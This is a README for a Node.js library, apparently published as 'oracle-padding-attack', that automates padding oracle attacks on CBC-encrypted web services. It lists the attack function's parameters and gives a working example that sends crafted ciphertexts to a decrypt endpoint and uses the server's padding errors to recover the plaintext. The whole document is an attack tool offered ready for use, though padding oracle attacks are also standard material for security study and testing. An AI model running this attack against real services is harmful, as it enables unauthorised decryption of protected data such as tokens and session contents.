# Oracle Padding Attack
Oracle Padding Attacker
* You can import it and specify HTTP request and checker function.

## Document
### Function Parameters
1. cipher (encrypted string, type: Buffer)
2. BLOCK size (8 or 16, type: number)
3. the function of requesting HTTP(s) and validating
> You should create function accepting one parameter called "data".<br>
> Request HTTP and validate "data" using status code or response.<br>
> if "data" is validated, return true, otherwise return false.
4. Options (there is only `{ debug: true }`, type: Object)

## Example
```js
const oracle_pad = require("oracle-padding-attack");
const axios = require("axios");
const querystring = require("querystring");

oracle_pad(
	Buffer.from("4H9sSSacHO+8vaRXohMgY7iazFba37eZ9FdQRdSQCenLmEaUoXiWIKOqEjA1hl1yCPHNb+mlCnh3pmdB+8Ya2A==", "base64"),
	16,
	async (data) => {
		return (await axios.get(`http://127.0.0.1/secure/decrypt?e_data=${querystring.escape(data)}&sig=&token=`))
			.data.result.message !== "ValueError";
		//In example code, ValueError occurs only if it is considered a padding error on the server side. 
	},
	{
		debug: true
	}
).then(decrypted => console.log(decrypted.toString('utf8')));
```